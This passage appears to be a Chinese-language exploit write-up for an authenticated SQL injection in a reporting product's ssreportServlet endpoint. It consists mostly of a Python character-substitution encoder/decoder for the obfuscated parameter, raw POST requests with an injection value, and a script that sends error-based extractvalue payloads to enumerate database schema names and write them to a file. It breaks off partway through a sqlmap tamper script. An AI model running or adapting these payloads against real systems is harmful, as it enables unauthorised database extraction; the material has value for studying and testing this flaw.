&quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;, }#此函数可以用来加密明文也可以解密服务器返回的密文def encode(code): out = &quot;&quot; for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return outdef decode(code): out = &quot;&quot; for item in code: out = out + DECODING_SCHEDULE.get(item, item) return outdef read(): with open('read.txt', 'r') as f: return f.read()a=read()b = decode(a)c = encode(a)print('Input: ' + a + '\\n')print('decode: ' + b + '\\n')print('decode-unquote-url: '+unquote(b,'utf-8'))print()print('encode: '+c)print() 注：加密和解密的过程就是替换字符的过程，最终解密得到的是url编码，加密时传入的文本也要是url编码 decode-unquote-url只是为了方便阅读 SQl注入需要登录，任意报表功能 https://127.0.0.1/vision/ssreportServlet 123456789101112131415POST /vision/ssreportServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/openresource.jsp?iPad=true&amp;refresh=true&amp;showtoolbar=false&amp;showPath=false&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp=1610433924926Content-Type: application/x-www-form-urlencodedContent-Length: 3293Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: FQPassword=; JSESSIONID=4BB550BF10C606619B753D3CE52CD3ABUpgrade-Insecure-Requests: 1sheetIndex=0&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId=Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType=refresh&amp;paramsInfoEncode=encode=/JV/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uu6(dp/uu/NO/uu/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uu(SR(D/uu/NO/uu/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uug(SQp/uu/NO/uun111/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uun111/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uug(SQp/uu/NO/uuKK7777/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/Vm/Vx/aK/V'/mt/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/'J/O'/am/'N/O'/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/'J/O'/am/'N/O'/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~MqRh/uu/ut/uu6(dp/uu/NO/uuRh/uu/ut/uu(SR(D/uu/NO/uu/aM/ON/'7/aM/VJ/'V/aM/mt/VO/aM/ma/'KRh/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu6(dp/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu(SR(D/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu6(dp/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu(SR(D/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu6(dp/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu(SR(D/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu6(dp/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu(SR(D/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/JT&amp;pageId=0&amp;writeBackData=&amp;exportSheetIndexes=&amp;exportId=&amp;op=%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D 解码并修改数据包直接注入（可直接使用）修改paramsInfoEncode为paramsInfo，将Encode参数去掉 123456789101112131415POST /vision/ssreportServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/openresource.jsp?iPad=true&amp;refresh=true&amp;showtoolbar=false&amp;showPath=false&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp=1610433924926Content-Type: application/x-www-form-urlencodedContent-Length: 3282Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: FQPassword=; JSESSIONID=4BB550BF10C606619B753D3CE52CD3ABUpgrade-Insecure-Requests: 1sheetIndex=0&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId=Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType=refresh&amp;paramsInfo=%5B%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22name%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22alias%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22value%22%3A%22'11111%22%2C%22displayValue%22%3A%22'11111%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22name%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22alias%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22value%22%3A%22440000%22%2C%22displayValue%22%3A%22%E5%B9%BF%E4%B8%9C%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id%22%2C%22name%22%3A%22id%22%2C%22alias%22%3A%22%E6%A3%80%E6%B5%8B%E6%9C%BA%E6%9E%84id%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%5D&amp;pageId=0&amp;writeBackData=&amp;exportSheetIndexes=&amp;exportId=&amp;op=%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D py脚本RMI加密后注入报错注入demo： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding=utf-8import requestsfrom urllib.parse import quote,unquoteimport refrom requests.packages.urllib3.exceptions import InsecureRequestWarning#去除https的warningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)ENCODING_SCHEDULE = { &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;'&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, &quot;%&quot;: &quot;/&quot;, &quot;'&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;,}DECODING_SCHEDULE = { &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;'&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, &quot;/&quot;: &quot;%&quot;, &quot;n&quot;: &quot;'&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;,}#此函数可以用来加密明文也可以解密服务器返回的密文def encode(code): out = &quot;&quot; for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return outdef decode(code): out = &quot;&quot; for item in code: out = out + DECODING_SCHEDULE.get(item, item) return outurl = &quot;https://127.0.0.1/vision/ssreportServlet&quot;headers = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36&quot;, &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;, &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;, &quot;Cookie&quot;:&quot;JSESSIONID=4BB550BF10C606619B753D3CE52CD3AB&quot; }origin1 = '''[{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.单位名称&quot;,&quot;name&quot;:&quot;单位名称&quot;,&quot;alias&quot;:&quot;单位名称&quot;,&quot;value&quot;:&quot;'''origin2 = '''&quot;,&quot;displayValue&quot;:&quot;'''origin3 = '''&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所属机构&quot;,&quot;name&quot;:&quot;所属机构&quot;,&quot;alias&quot;:&quot;所属机构&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在省份&quot;,&quot;name&quot;:&quot;所在省份&quot;,&quot;alias&quot;:&quot;所在省份&quot;,&quot;value&quot;:&quot;440000&quot;,&quot;displayValue&quot;:&quot;广东&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在地市&quot;,&quot;name&quot;:&quot;所在地市&quot;,&quot;alias&quot;:&quot;所在地市&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在区县&quot;,&quot;name&quot;:&quot;所在区县&quot;,&quot;alias&quot;:&quot;所在区县&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id&quot;,&quot;name&quot;:&quot;id&quot;,&quot;alias&quot;:&quot;检测机构id&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间起&quot;,&quot;name&quot;:&quot;填报时间起&quot;,&quot;alias&quot;:&quot;填报时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间止&quot;,&quot;name&quot;:&quot;填报时间止&quot;,&quot;alias&quot;:&quot; 填报时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间起&quot;,&quot;name&quot;:&quot;更新时间起&quot;,&quot;alias&quot;:&quot;更新时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间止&quot;,&quot;name&quot;:&quot;更新时间止&quot;,&quot;alias&quot;:&quot;更新时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;}]'''for i in range(1,20): payload = &quot;%' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit {0},1),0x7e)) and null = '%&quot;.format(i) # print(payload) origin_full = origin1 + payload + origin2 + payload + origin3 # print(origin_full) url_encode_full = quote(origin_full) # print(url_encode_full) rmi_encode = encode(url_encode_full) # print(rmi_encode) encode_final = 'encode='+rmi_encode data = { &quot;resid&quot;:&quot;I40281d81016a8bc28bc20231016aaee007b230ac&quot;, &quot;clientId&quot;:&quot;Iff8080810176f0c7f0c7544f0176f54eb72c1160&quot;, &quot;refreshType&quot;:&quot;refresh&quot;, &quot;paramsInfoEncode&quot;:encode_final } #proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} r = requests.post(url,data=data,headers=headers,verify=False) #print(r.text) regex = r&quot;~\\w+~&quot; match = re.search(regex,r.text).span() #返回第一个匹配到的结果的位置（1000,1005） database = r.text[match[0]+1:match[1]-1] print(r.text[match[0]:match[1]]) with open('file.txt','a+') as f: f.write(database+'\\n') 在想怎么结合sqlmap写tamper指定位置实现注入，需要修改tamper, 可以实现Payload加密，有时间的话研究一下sqlmap源码可以写一个全加密的tamper 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding=utf-8#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom urlparse import unquote__priority__ = PRIORITY.LOWENCODING_SCHEDULE = { &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;'&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, &quot;%&quot;: &quot;/&quot;, &quot;'&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: 